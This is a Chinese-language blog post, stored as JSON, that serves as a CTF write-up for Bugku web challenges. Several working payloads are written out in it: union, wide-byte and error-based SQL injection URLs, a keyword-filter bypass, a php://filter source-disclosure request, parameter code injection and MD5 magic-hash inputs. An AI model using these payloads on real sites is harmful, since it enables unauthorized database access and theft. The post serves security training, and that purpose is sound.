{"title":"Bugku Web题刷题记录（会持续更新）","slug":"Bugku Web题刷题记录（会持续更新）","date":"2018-03-28T12:30:29.000Z","updated":"2019-09-12T06:22:41.000Z","comments":true,"path":"api/articles/Bugku Web题刷题记录（会持续更新）.json","photos":[],"link":"","excerpt":null,"covers":["../../../../image/2.png","../../../../image/3.png","../../../../image/4.png","../../../../image/5.png","../../../../image/6.png","../../../../image/7.png","../../../../image/8.png","../../../../image/9.png","../../../../image/10.png","../../../../image/11.png","../../../../image/12.png","../../../../image/13.png","../../../../image/14.png","../../../../image/15.png","../../../../image/16.png","../../../../image/17.png","../../../../image/18.png","../../../../image/19.png","../../../../image/20.png","../../../../image/21.png","../../../../image/22.png","../../../../image/23.png","../../../../image/24.png","../../../../image/25.png","../../../../image/26.png","../../../../image/27.png","../../../../image/28.png","../../../../image/29.png","../../../../image/30.png"],"content":"<p> <a href=\"http://creativecommons.org/licenses/by-sa/4.0/\" target=\"_blank\" rel=\"noopener\"> </a> 版权声明：本文为博主原创文章，遵循<a href=\"http://creativecommons.org/licenses/by-sa/4.0/\" target=\"_blank\" rel=\"noopener\"> CC 4.0 BY-SA </a>版权协议，转载请附上原文出处链接和本声明。  本文链接：<a href=\"https://blog.csdn.net/s1054436218/article/details/79733345\" target=\"_blank\" rel=\"noopener\">https://blog.csdn.net/s1054436218/article/details/79733345</a>   </p>\n<p>   之前web题做的不太多，现在多刷一点，写一下writeup记录一下，也方便以后复习。</p>\n<p><strong>sql注入</strong></p>\n<p>宽字符注入，题目说找key表的string字段了，so payload如下：</p>\n<p><a href=\"http://103.238.227.13:10083/?id=1%DF%27union\" target=\"_blank\" rel=\"noopener\">http://103.238.227.13:10083/?id=1%df%27union</a>select string,1 from sql5.key%23</p>\n<p>域名解析</p>\n<p>这道题写wp的时候打不开了，不过当时做的时候只要把host改成这个ip地址就行了</p>\n<p><img src=\"../../../../image/2.png\" alt></p>\n<p><strong>sql注入2</strong></p>\n<p>这个题先是waf，有敏感词直接exit。但是后面有一个过滤xss的函数，会除去&lt;….&gt;之类的东西，所以只要在参数中的敏感词里添加&lt;&gt;就可以注入了。</p>\n<p>首先爆数据库名：</p>\n<p><a href=\"http://103.238.227.13:10087/?id=1\" target=\"_blank\" rel=\"noopener\">http://103.238.227.13:10087/?id=1</a>un&lt;&gt;ion sel&lt;&gt;ect database(),1%23</p>\n<p>题目说查key表的hash字段，所以直接再查一下就拿到flag了：</p>\n<p><a href=\"http://103.238.227.13:10087/?id=1\" target=\"_blank\" rel=\"noopener\">http://103.238.227.13:10087/?id=1</a>un&lt;&gt;ion sel&lt;&gt;ect hash,1 fr&lt;&gt;om sql3.key%23</p>\n<p><strong>你必须让他停下</strong></p>\n<p>这题也挺无聊的，bp抓包以后多go几次就出来了</p>\n<p><img src=\"../../../../image/3.png\" alt></p>\n<p><strong>本地包含</strong></p>\n<p><a href=\"http://120.24.86.145:8003/?hello=print_r(file(%27test.php%27))\" target=\"_blank\" rel=\"noopener\">http://120.24.86.145:8003/?hello=print_r(file(‘test.php’))</a></p>\n<p><strong>变量1</strong></p>\n<p><a href=\"http://120.24.86.145:8004/index1.php?args=GLOBALS\" target=\"_blank\" rel=\"noopener\">http://120.24.86.145:8004/index1.php?args=GLOBALS</a></p>\n<p><strong>Web5</strong></p>\n<p>看源代码，直接把jsfuck丢到Consle里</p>\n<p><img src=\"../../../../image/4.png\" alt></p>\n<p><strong>头等舱</strong></p>\n<p>没什么意思的题，直接抓包就可以了</p>\n<p><img src=\"../../../../image/5.png\" alt></p>\n<p><strong>Web4</strong></p>\n<p>查看源码urldecode以后整理如下</p>\n<p><img src=\"../../../../image/6.png\" alt></p>\n<p>直接submit”67d709b2b54aa2aa648cf6e87a7114f1”，就得到flag了</p>\n<p>flag在Index里</p>\n<p>用伪协议查看base64加密后的源码</p>\n<p><a href=\"http://120.24.86.145:8005/post/index.php?file=php://filter/read/convert.base64-encode/resource=index.php\" target=\"_blank\" rel=\"noopener\">http://120.24.86.145:8005/post/index.php?file=php://filter/read/convert.base64-encode/resource=index.php</a></p>\n<p>解密后的源码里有flag</p>\n<p><strong>点击一万次</strong></p>\n<p>查看源代码：</p>\n<p><img src=\"../../../../image/7.png\" alt></p>\n<p>在Console里让clicks为999999</p>\n<p>然后再点一次就出flag了</p>\n<p><strong>备份是个好习惯</strong></p>\n<p>地址后添加index.php.bak可以下到源码，打开查看如下</p>\n<p><img src=\"../../../../image/8.png\" alt></p>\n<p>就是找两个不相等的值md5相同，分别传参240610708和QNKCDZO，然后就可以拿到flag了</p>\n<p><strong>成绩单</strong></p>\n<p>首先获取数据库名</p>\n<p><img src=\"../../../../image/9.png\" alt></p>\n<p>然后爆表名</p>\n<p>id=0’ union selectdatabase(),table_name,1,1 from information_schema.tables wheretable_schema=’skctf_flag’#</p>\n<p>爆列名</p>\n<p>id=0’ union selectdatabase(),table_name,column_name,1 from information_schema.columns wheretable_schema=’skctf_flag’ and table_name = ‘fl4g’#</p>\n<p>拿flag</p>\n<p>id=0’ union select skctf_flag,1,1,1from skctf_flag.fl4g#</p>\n<p><strong>秋名山老司机</strong></p>\n<p>其实这道题本来也挺简单的，直接写脚本获取到数值提交上去就能得到flag了，坑点是必须要在是这个页面的时候才能得到flag</p>\n<p><img src=\"../../../../image/10.png\" alt></p>\n<p>所以直接照着这个页面写，多运行几次就行了，要注意cookie一致，很简单的脚本就不列出来了。</p>\n<p><strong>速度要快</strong></p>\n<p>抓包以后发现一串base64码</p>\n<p><img src=\"../../../../image/11.png\" alt></p>\n<p>Base64解密并Utf-8解码以后如下</p>\n<p><img src=\"../../../../image/12.png\" alt></p>\n<p>这个值每次都会变，而且要立刻提交，所以写个脚本就行了，也比较简单。</p>\n<p><strong>cookies欺骗</strong></p>\n<p>刚开始的网址是这样的：</p>\n<p><a href=\"http://120.24.86.145:8002/web11/index.php?line=&amp;filename=a2V5cy50eHQ=\" target=\"_blank\" rel=\"noopener\">http://120.24.86.145:8002/web11/index.php?line=&amp;filename=a2V5cy50eHQ=</a></p>\n<p>filename拿去base64解密，是key.txt，于是尝试filename=index.php的base64码，未果，修改行号，发现出现内容，于是一行一行输出，最终得到如下代码：</p>\n<p><img src=\"../../../../image/13.png\" alt></p>\n<p>根据逻辑，修改一下cookies，得到flag</p>\n<p><img src=\"../../../../image/14.png\" alt></p>\n<p><strong>多次</strong></p>\n<p>写这个wp的时候已经是做出来好久了，居然发现都快忘记怎么做了，看来以后做题还是应该留个记录。</p>\n<p>第一关</p>\n<p>首先经尝试会发现union、select等关键词会报错：</p>\n<p><img src=\"../../../../image/15.png\" alt></p>\n<p>于是尝试看看是不是被过滤的，中间加个and果然不报错了：</p>\n<p><img src=\"../../../../image/16.png\" alt></p>\n<p>由于回显只有一行，所以要让第一个查询变为Flase，即加上and 1=2(顺便把数据库也爆出来)</p>\n<p><img src=\"../../../../image/17.png\" alt></p>\n<p>然后一步步尝试发现where和from都没有被过滤，or被过滤了</p>\n<p><img src=\"../../../../image/18.png\" alt></p>\n<p>然后爆表名</p>\n<p><img src=\"../../../../image/19.png\" alt></p>\n<p>爆列名，注意有两个</p>\n<p><img src=\"../../../../image/20.png\" alt></p>\n<p><img src=\"../../../../image/21.png\" alt></p>\n<p>然后那个flag其实没什么卵用，address是第二关：</p>\n<p><img src=\"../../../../image/22.png\" alt></p>\n<p>第二关</p>\n<p><img src=\"../../../../image/23.png\" alt></p>\n<p>可以通过操纵id来注入，这次waf比上次厉害些，敏感词别想着过滤了。</p>\n<p>试了一下and 1=1，发现有报错：</p>\n<p><img src=\"../../../../image/24.png\" alt></p>\n<p>可以利用报错注入，首先爆数据库名：</p>\n<p><img src=\"../../../../image/25.png\" alt></p>\n<p>然后爆表名：</p>\n<p><a href=\"http://120.24.86.145:9004/Once_More.php?id=1%27or\" target=\"_blank\" rel=\"noopener\">http://120.24.86.145:9004/Once_More.php?id=1’or</a>(select count(<em>)b,concat((select table_name from information_schema.tableswhere table_schema = ‘web1002-2’ limit 0,1),floor(rand(0)</em>2))a frominformation_schema.tables group by a)=(1,1)%23</p>\n<p><img src=\"../../../../image/26.png\" alt></p>\n<p><img src=\"../../../../image/27.png\" alt></p>\n<p>看上去是flag2了，我们可以爆一下flag2的列名：</p>\n<p><a href=\"http://120.24.86.145:9004/Once_More.php?id=1%27or\" target=\"_blank\" rel=\"noopener\">http://120.24.86.145:9004/Once_More.php?id=1’or</a>(select count(<em>)b,concat((select column_name from information_schema.columnswhere table_schema = ‘web1002-2’ and table_name=’flag2’ limit 0,1),floor(rand(0)</em>2))afrom information_schema.tables group by a)=(1,1)%23</p>\n<p><img src=\"../../../../image/28.png\" alt></p>\n<p>最后想拿flag，发现出现了一个问题：</p>\n<p><img src=\"../../../../image/29.png\" alt></p>\n<p>这个情况表明返回的内容中有回车，substring没有用，于是尝试left，发现没问题，于是直接left就可以出结果了：</p>\n<p><a href=\"http://120.24.86.145:9004/Once_More.php?id=1%27or\" target=\"_blank\" rel=\"noopener\">http://120.24.86.145:9004/Once_More.php?id=1%27or</a>(select count(<em>)b,concat(left((select flag2 from flag2 limit0,1),40),floor(rand(0)</em>2))a from information_schema.tables group by a)=(1,1)%23</p>\n<p><img src=\"../../../../image/30.png\" alt></p>\n<p>第三关</p>\n<p>进来发现一张二维码……然后它提示是参数是game，flag在admin中，然而没卵用，感觉game怎么注都没反应，希望有大佬做出来指点一下吧。</p>\n<p>初入web坑，欢迎大家互相交流~</p>\n","categories":[],"tags":[{"name":"CSDN迁移","slug":"CSDN迁移","count":25,"path":"api/tags/CSDN迁移.json"}]}